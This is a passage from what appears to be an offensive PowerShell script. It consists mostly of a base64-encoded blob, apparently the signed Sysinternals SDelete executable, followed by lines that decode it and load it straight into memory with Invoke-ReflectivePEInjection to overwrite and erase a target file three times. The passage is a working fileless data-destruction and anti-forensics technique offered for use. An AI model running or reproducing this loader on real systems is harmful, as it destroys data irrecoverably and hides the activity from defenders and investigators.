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'
	$PEBytes = [System.Convert]::FromBase64String($InputString)
	$Args = '-nobanner -accepteula -p 3 ' + $FilePath
	Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Args -DoNotZeroMZ
}